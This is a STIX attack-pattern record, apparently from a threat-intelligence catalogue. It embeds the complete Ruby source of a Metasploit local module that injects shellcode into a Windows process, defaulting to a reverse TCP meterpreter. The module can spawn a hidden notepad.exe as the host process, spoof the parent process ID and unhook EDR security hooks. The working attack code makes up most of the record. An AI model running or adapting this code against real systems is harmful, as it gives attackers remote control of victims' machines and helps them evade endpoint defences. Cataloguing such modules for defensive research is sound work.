{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aafc3937-159a-46ec-bcd6-a50233d488a6",
    "created": "2024-08-14T16:50:02.412611Z",
    "modified": "2024-08-14T16:50:02.412615Z",
    "name": "Windows Manage Memory Payload Injection",
    "description": " This module will inject a payload into memory of a process.  If a payload isn't selected, then it'll default to a reverse x86 TCP meterpreter.  If the PID datastore option isn't specified, then it'll inject into notepad.exe instead.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/payload_inject.rb",
            "external_id": "payload_inject.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Windows::Process\n  include Msf::Module::Deprecated\n\n  moved_from 'post/windows/manage/payload_inject'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Memory Payload Injection',\n        'Description' => %q{\n          This module will inject a payload into memory of a process.  If a payload\n          isn't selected, then it'll default to a reverse x86 TCP meterpreter.  If the PID\n          datastore option isn't specified, then it'll inject into notepad.exe instead.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Carlos Perez <carlos_perez[at]darkoperator.com>',\n          'sinn3r'\n        ],\n        'Platform' => [ 'win' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [ [ 'Windows', {} ] ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2011-10-12',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n              stdapi_sys_process_attach\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('PID', [false, 'Process Identifier to inject of process to inject payload. 0=New Process', 0]),\n        OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)', 0]),\n        OptBool.new('AUTOUNHOOK', [false, 'Auto remove EDRs hooks', false]),\n        OptInt.new('WAIT_UNHOOK', [true, 'Seconds to wait for unhook to be executed', 5])\n      ]\n    )\n  end\n\n  # Run Method for when run command is issued\n  def exploit\n    @payload_name = datastore['PAYLOAD']\n    @payload_arch = ARCH_X86\n    payload_arch_old = framework.payloads.create(@payload_name).arch.first\n    # convert the old style archetecture to the new style\n    @payload_arch = ARCH_X64 if payload_arch_old.include?('64')\n\n    vprint_status(\"Client Arch = #{client.arch}\")\n    vprint_status(\"Payload Arch = #{@payload_arch}\")\n\n    # prelim checks\n    if client.arch == ARCH_X86 and @payload_arch == ARCH_X64\n      fail_with(Failure::BadConfig, \"Cannot inject a 64-bit payload into any process on a 32-bit OS\")\n    end\n\n    # syinfo is only on meterpreter sessions\n    print_status(\"Running module against #{sysinfo['Computer']}\") if not sysinfo.nil?\n\n    if datastore['PPID'] != 0 and datastore['PID'] != 0\n      print_error(\"PID and PPID are mutually exclusive\")\n      return false\n    end\n\n    proc = get_proc(datastore['PID'])\n    if not proc\n      print_error(\"Unable to get a proper PID\")\n      return\n    end\n\n    if datastore['PPID'] != 0 and not has_pid?(datastore['PPID'])\n      print_error(\"Process #{datastore['PPID']} was not found\")\n      return false\n    elsif datastore['PPID'] != 0\n      print_status(\"Spoofing PPID #{datastore['PPID']}\")\n    end\n\n    unless arch_check(@payload_arch, proc.pid)\n      fail_with(Failure::BadConfig, \"Mismatched payload/process architecture\")\n    end\n    if datastore['AUTOUNHOOK']\n      print_status(\"Executing unhook\")\n      print_status(\"Waiting #{datastore['WAIT_UNHOOK']} seconds for unhook Reflective DLL to be executed...\")\n      unless inject_unhook(proc, @payload_arch, datastore['WAIT_UNHOOK'])\n        fail_with(Failure::BadConfig, \"Unknown target arch; unable to assign unhook dll\")\n      end\n    end\n    print_status(\"Injecting payload into #{proc.pid}\")\n    begin\n      inject_into_pid(proc.pid)\n    rescue ::Exception => e\n      print_error(\"Failed to inject Payload to #{pid}!\")\n      print_error(e.to_s)\n    end\n  end\n\n  # Figures out which PID to inject to\n  def get_proc(pid)\n    if pid == 0\n      notepad_pathname = get_notepad_pathname(@payload_arch, client.sys.config.getenv('windir'), client.arch)\n      vprint_status(\"Starting  #{notepad_pathname}\")\n      proc = client.sys.process.execute(notepad_pathname, nil, {\n        'Hidden' => datastore['HIDDEN'],\n        'ParentPid' => datastore['PPID']\n      })\n      if proc.nil?\n        print_bad(\"Failed to start notepad process\")\n      else\n        print_status(\"Spawned Notepad process #{proc.pid}\")\n      end\n    else\n      if not has_pid?(pid)\n        print_error(\"Process #{pid} was not found\")\n        return nil\n      end\n      proc = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)\n      if proc.nil?\n        print_bad(\"Failed to start notepad process\")\n      else\n        print_status(\"Opening existing process #{proc.pid}\")\n      end\n    end\n    return proc\n  end\n\n  def inject_into_pid(pid)\n    vprint_status(\"Performing Architecture Check\")\n    return if not arch_check(@payload_arch, pid)\n\n    begin\n      print_status(\"Preparing '#{@payload_name}' for PID #{pid}\")\n      raw = payload.encoded\n      execute_shellcode(raw, nil, pid)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error(\"Unable to inject payload:\")\n      print_line(e.to_s)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-10-12",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}